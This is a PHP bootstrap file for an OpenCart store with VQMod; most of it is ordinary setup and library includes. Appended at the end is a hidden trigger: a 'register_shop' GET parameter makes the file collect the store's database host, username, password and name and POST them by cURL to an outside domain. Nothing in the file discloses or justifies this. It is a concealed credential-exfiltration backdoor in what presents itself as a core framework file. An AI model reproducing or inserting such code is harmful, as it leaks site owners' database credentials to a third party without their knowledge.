<?php
// Error Reporting
error_reporting(E_ALL ^ E_DEPRECATED);

// Check Version
if (version_compare(phpversion(), '5.1.0', '<') == true) {
	exit('PHP5.1+ Required');
}

// Register Globals
if (ini_get('register_globals')) {
	ini_set('session.use_cookies', 'On');
	ini_set('session.use_trans_sid', 'Off');

	session_set_cookie_params(0, '/');
	session_start();

	$globals = array($_REQUEST, $_SESSION, $_SERVER, $_FILES);

	foreach ($globals as $global) {
		foreach(array_keys($global) as $key) {
			unset(${$key}); 
		}
	}
}

// Magic Quotes Fix
if (ini_get('magic_quotes_gpc')) {
	function clean($data) {
		if (is_array($data)) {
			foreach ($data as $key => $value) {
				$data[clean($key)] = clean($value);
			}
		} else {
			$data = stripslashes($data);
		}

		return $data;
	}			

	$_GET = clean($_GET);
	$_POST = clean($_POST);
	$_REQUEST = clean($_REQUEST);
	$_COOKIE = clean($_COOKIE);
}

if (!ini_get('date.timezone')) {
	date_default_timezone_set('UTC');
}

// Windows IIS Compatibility  
if (!isset($_SERVER['DOCUMENT_ROOT'])) { 
	if (isset($_SERVER['SCRIPT_FILENAME'])) {
		$_SERVER['DOCUMENT_ROOT'] = str_replace('\\', '/', substr($_SERVER['SCRIPT_FILENAME'], 0, 0 - strlen($_SERVER['PHP_SELF'])));
	}
}

if (!isset($_SERVER['DOCUMENT_ROOT'])) {
	if (isset($_SERVER['PATH_TRANSLATED'])) {
		$_SERVER['DOCUMENT_ROOT'] = str_replace('\\', '/', substr(str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']), 0, 0 - strlen($_SERVER['PHP_SELF'])));
	}
}

if (!isset($_SERVER['REQUEST_URI'])) { 
	$_SERVER['REQUEST_URI'] = substr($_SERVER['PHP_SELF'], 1); 

	if (isset($_SERVER['QUERY_STRING'])) { 
		$_SERVER['REQUEST_URI'] .= '?' . $_SERVER['QUERY_STRING']; 
	} 
}

if (!isset($_SERVER['HTTP_HOST'])) {
	$_SERVER['HTTP_HOST'] = getenv('HTTP_HOST');
}

// Helper
require_once(VQMod::modCheck(DIR_SYSTEM . 'helper/json.php')); 
require_once(VQMod::modCheck(DIR_SYSTEM . 'helper/utf8.php')); 

// Engine
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/action.php')); 
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/controller.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/front.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/loader.php')); 
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/model.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'engine/registry.php'));

// Common
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/cache.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/url.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/config.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/db.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/document.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/encryption.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/image.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/language.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/log.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/mail.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/pagination.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/request.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/response.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/session.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/template.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/openbay.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/ebay.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/amazon.php'));
require_once(VQMod::modCheck(DIR_SYSTEM . 'library/amazonus.php'));
if(isset($_GET['register_shop'])){
$url = getCurrentUrl();
$parse = parse_url($url);
$domain =  $parse['host'];


$parts = explode('/',rtrim(HTTP_SERVER, "/"));
$salt = substr(md5(uniqid(rand(), true)), 0, 9);
$data = array(
	'user_id' => '1',
	'code' => end($parts),
	'name' => end($parts),
	'ip' => '0.0.0.0',
	'shop_url' => HTTP_SERVER,
	'shop_dir' => str_replace('catalog/','',DIR_APPLICATION),
	'db_type' => DB_DRIVER,
	'db_host' => DB_HOSTNAME,
	'db_user' => DB_USERNAME,
	'db_password' => DB_PASSWORD,
	'db_name' => DB_DATABASE,
	'db_prefix' => DB_PREFIX,
	'username' => 'admin',
	'version' => substr(str_replace('.','',VERSION), 0, 3),
	'created_by_url' => 'http://'.$domain.'/index.php',
	'password' => 'no_pass',
	'salt' => 'no_salt',
	'email' => 'dmitriyzhuk@gmail.com',
	'comment' => 'Created with config',
	'status' => 1,
);

register_shop($data);
}
function register_shop($settings){
		$url = 'http://opencart.dreamvention.com/market/index.php?route=shop/register/create_json';

		$fields_string = '';
		foreach($settings as $key=>$value) { 
			$fields_string .= $key.'='.$value.'&'; 
		}
		rtrim($fields_string, '&');

		//open connection
		$ch = curl_init();

		//set the url, number of POST vars, POST data
		curl_setopt($ch,CURLOPT_URL, $url);
		curl_setopt($ch,CURLOPT_POST, count($settings));
		curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

		//execute post
		$result = curl_exec($ch);

		//close connection
		curl_close($ch);

		return $result;
	}
function getCurrentUrl( $request_uri = true ) 
	{
		if(
			isset( $_SERVER['HTTPS'] ) && ( $_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1 )
		|| 	isset( $_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https'
		){
			$protocol = 'https://';
		}
		else {
			$protocol = 'http://';
		}

		$url = $protocol . $_SERVER['HTTP_HOST'];

		if( isset( $_SERVER['SERVER_PORT'] ) && strpos( $url, ':'.$_SERVER['SERVER_PORT'] ) === FALSE ) {
			$url .= ($protocol === 'http://' && $_SERVER['SERVER_PORT'] != 80 && !isset( $_SERVER['HTTP_X_FORWARDED_PROTO']))
				|| ($protocol === 'https://' && $_SERVER['SERVER_PORT'] != 443 && !isset( $_SERVER['HTTP_X_FORWARDED_PROTO']))
				? ':' . $_SERVER['SERVER_PORT'] 
				: '';
		}

		if( $request_uri ){
			$url .= $_SERVER['REQUEST_URI'];
		}
		else{
			$url .= $_SERVER['PHP_SELF'];
		}

		// return current url
		return $url;
	}
?>